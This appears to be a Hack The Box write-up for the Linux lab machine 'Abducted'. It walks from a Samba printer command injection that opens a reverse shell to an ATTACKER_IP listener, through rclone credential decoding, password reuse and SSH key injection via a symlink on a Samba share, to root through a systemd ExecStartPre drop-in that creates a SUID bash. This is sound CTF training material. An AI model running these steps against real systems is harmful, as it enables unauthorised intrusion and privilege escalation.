# Hack The Box: Abducted (Medium / Linux)

> Medium Linux box. Path: anonymous SMB enumeration finds a guest-accessible printer share → CVE-2026-4480 Samba print command injection (pre-auth RCE as `nobody`) → rclone config leaks a service account password → decoded and reused for SSH as `scott` (user flag) → Samba `wide links` + `force user` misconfiguration lets scott plant a symlink and write an SSH key into marcus's home dir → SSH as marcus → `operators` group has write access to a systemd drop-in directory → polkit grants passwordless `daemon-reload` → malicious `ExecStartPre` fires as root → root flag.

## Overview
- Target: Ubuntu 24.04, single NIC, Samba on 139/445 and SSH on 22. No web server.
- Attack path: null SMB session → CVE-2026-4480 printer RCE → rclone credential decode → password reuse (scott) → SMB `wide links` + `force user` symlink → SSH key injection (marcus) → `operators` group → systemd drop-in → polkit passwordless reload → root.
- Key theme: nothing here required memory corruption. Every step was a misconfiguration or reused credential, with the printer share as the only anonymous attack surface.

## Recon / Enumeration

### Nmap
```bash
nmap -p- --min-rate 1000 -T4 <TARGET> -oN nmap/allports.txt
nmap -p 22,139,445 -sC -sV <TARGET> -oN nmap/targeted.txt
```
Open ports:
- `22/tcp` OpenSSH 9.6p1 (Ubuntu), current version, not the way in.
- `139/tcp` Samba smbd 4 (NetBIOS)
- `445/tcp` Samba smbd 4

Key nmap script output:
- `nbstat`: NetBIOS name `ABDUCTED`
- `smb2-security-mode`: message signing enabled but not required
- Server string (visible later in smb.conf): "Hartley Group Document Services"

With only SSH and Samba exposed, Samba is the entire attack surface.

### SMB enumeration
```bash
# list shares as a null/anonymous session (-N = no password)
smbclient -L //<TARGET>/ -N
```
Share listing:
```
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```
```bash
# confirm disk shares are locked to guests
smbclient //<TARGET>/projects -N   # NT_STATUS_ACCESS_DENIED
smbclient //<TARGET>/transfer -N   # NT_STATUS_ACCESS_DENIED
```

Findings:
- Both disk shares reject anonymous access.
- `HP-Reception` is the only share accessible without credentials.
- The org name "Hartley Group" leaks through the share comments, useful context for later.

> Tip: the SMB1 fallback error at the end of `smbclient -L` output is harmless noise. Modern Samba refuses SMB1 for workgroup listings. Ignore it.

## Foothold

### 1. CVE-2026-4480: Samba print command injection (pre-auth RCE)

CVE-2026-4480 is a pre-authentication OS command injection (CWE-78, CVSS 10.0) in Samba's printing subsystem. It requires two conditions to be met simultaneously:

1. `printing = sysv` in the global config. This tells Samba to use an external `print command` shell directive instead of the CUPS API. Servers using `printing = cups` or `printing = iprint` are **not affected**.
2. `%J` in the `print command` string. This substitutes the client-supplied job description directly into the shell command before calling `system()`. Before the fix, only single quotes were sanitised. Every other shell metacharacter (pipe, semicolon, ampersand, backtick, redirection operators) passed through unchanged.

Since `HP-Reception` had `guest ok = yes`, no credentials are required. The vulnerable config (confirmed later from a shell):
```ini
# /etc/samba/smb.conf
printing = sysv

# /etc/samba/shares.conf
[HP-Reception]
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

The exploit (TheCyberGeek/CVE-2026-4480-PoC) uses Samba's own Python bindings to speak the `spoolss` RPC protocol directly. The job name is set to `|sh`, which transforms the print command into `printaudit <spoolfile> |sh`. The spool file body (written via `WritePrinter`) is the reverse shell payload, a bash one-liner connecting back to the listener. Nothing fires until `EndDocPrinter()` is called, at which point `system()` runs and the payload executes.

```bash
sudo apt install python3-samba
git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC.git
cd CVE-2026-4480-PoC

# terminal 1
nc -lvnp 4444
# terminal 2
python3 exploit.py <TARGET> <ATTACKER_IP> 4444
```

Shell received as `nobody` in `/var/spool/samba`.

## Lateral Movement

### 2. nobody to scott: rclone credential decode

```bash
find / -name "rclone.conf" 2>/dev/null
# /opt/offsite-backup/rclone.conf

cat /opt/offsite-backup/rclone.conf
cat /opt/offsite-backup/sync.sh
```

The config stores credentials for an SFTP remote named `offsite` (hostname `backup.hartley-group.internal`). The sync script shows it pushes `/srv/projects` from the local machine to that remote. The hostname is not in `/etc/hosts` and does not resolve from this machine, so the remote is unreachable. That does not matter.

rclone's `obscure` function is documented as not being encryption. It is a reversible transformation using a fixed key baked into rclone's source code. The `reveal` subcommand decodes it instantly:
```bash
rclone reveal <obscured_password_value>
```

This gives the plaintext password for `svc-backup`. That account has no entry in `/etc/passwd` and SSH login fails for it. However, `/srv/projects` and `/srv/transfer` are both owned by a local user named `scott`. The person who set up the backup job reused the same password for their own account.

```bash
ssh scott@<TARGET>
cat ~/user.txt   # USER FLAG
```

> Tip: always check whether SFTP or remote service credentials are reused by local accounts before spending time trying to reach an unreachable host.

### 3. scott to marcus: SMB wide links + force user

Reading the full Samba config as scott reveals the misconfiguration:

```bash
cat /etc/samba/smb.conf
cat /etc/samba/shares.conf
```
```ini
# global section
unix extensions = no
allow insecure wide links = yes

# [transfer] share
force user = marcus
wide links = yes
```

Two directives on the `transfer` share do the work:
- `wide links = yes` allows Samba to follow symlinks that point outside the share directory. Normally Samba restricts symlink traversal to within the share path. This requires `unix extensions = no` globally and `allow insecure wide links = yes` as prerequisites; both are set.
- `force user = marcus` means every filesystem operation through this share executes as `marcus`, regardless of who authenticated.

Scott is a valid user on the share and can write to `/srv/transfer`. Planting a symlink there pointing at marcus's home directory causes Samba to follow it as marcus, enabling reads and writes into his home dir without knowing his password.

```bash
# on the box as scott
ln -s /home/marcus /srv/transfer/marcus_link
```

Marcus had no pre-existing `.ssh/` directory, but `force user = marcus` applies to writes too. The attack is to create his `.ssh/` directory and write our own public key into it through the share.

```bash
# generate a keypair on the target (no need to touch the attacker machine)
ssh-keygen -t rsa -f /tmp/marcus_key -N ""

# write the key as marcus via smbclient on localhost
smbclient //127.0.0.1/transfer -U scott%<PASSWORD> \
  -c "mkdir marcus_link/.ssh; put /tmp/marcus_key.pub marcus_link/.ssh/authorized_keys"

# SSH in as marcus using the injected key
ssh -i /tmp/marcus_key marcus@localhost
```

## Privilege Escalation

### Enumerate: operators group and systemd drop-in directory

```bash
id
# uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)

find / -group operators 2>/dev/null
# /etc/systemd/system/smbd.service.d
```

`operators` is a non-standard group with write access to the systemd drop-in directory for `smbd`. Drop-in directories let you place `.conf` files inside `<service>.d/` that get merged with the original unit at the next `daemon-reload`. This means adding directives to how `smbd` starts is possible without touching the unit file directly.

Reloading systemd normally requires root, but polkit can grant specific actions to groups without a password:
```bash
pkaction | grep systemd
# org.freedesktop.systemd1.reload-daemon  <- this one

systemctl daemon-reload && echo "OK"   # returns OK with no password prompt
```

A polkit rule grants the `operators` group the ability to call `org.freedesktop.systemd1.reload-daemon` without authentication.

### Exploit: ExecStartPre payload via drop-in

`ExecStartPre` is a systemd directive that runs a command before the main service process. For `smbd` that means it runs as root. Write a drop-in that copies bash to `/tmp` with the SUID bit set, reload the daemon to pick it up, restart smbd to trigger the directive, and call the SUID binary in privileged mode.

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
EOF

systemctl daemon-reload   # no password needed, polkit allows it for operators
systemctl restart smbd    # ExecStartPre fires as root

/tmp/rootbash -p          # -p preserves the SUID effective UID
```

```bash
cat /root/root.txt   # ROOT FLAG
```

## Loot
- user flag: `[redacted]`
- root flag: `[redacted]`
- creds found:
  - `svc-backup` : decoded from rclone obscured value (SFTP remote; leaked in /opt/offsite-backup/rclone.conf)
  - `scott` : same decoded password (SSH; reused from svc-backup config)

## Techniques used
- Null SMB session enumeration
- CVE-2026-4480 (Samba print command `%J` injection)
- rclone credential decode (`rclone reveal`)
- Credential reuse
- SMB `wide links` + `force user` symlink abuse
- SSH authorized_keys injection via forced user context
- Systemd drop-in `ExecStartPre` privilege escalation
- Polkit passwordless action (`org.freedesktop.systemd1.reload-daemon`)
- SUID bash (`/tmp/rootbash -p`)

## Lessons / what tripped me up
- **`ACCESS_DENIED` on disk shares is not a dead end.** It just meant the printer was the only anonymous door. Resist the urge to keep hammering SMB enum when one path is clearly open.
- **rclone `obscure` is not encryption.** One `rclone reveal` command hands you the plaintext. Never trust credentials stored this way to be safe.
- **`force user` is a write primitive too.** Most people think of it as a way to read another user's files. It also lets you write files owned by that user, which is how the SSH key injection works without ever knowing marcus's password.
- **The SFTP host not resolving is not a blocker.** The credential in the rclone config is what matters. Check whether it is reused locally before spending time trying to reach an unreachable host.
- **Use `-p` not `-i` for SUID bash.** The `-p` flag preserves the effective UID from the SUID bit. Without it, bash drops back to the real UID and the elevation is lost.

## Report notes
- Steps reproducible from notes alone: [x]
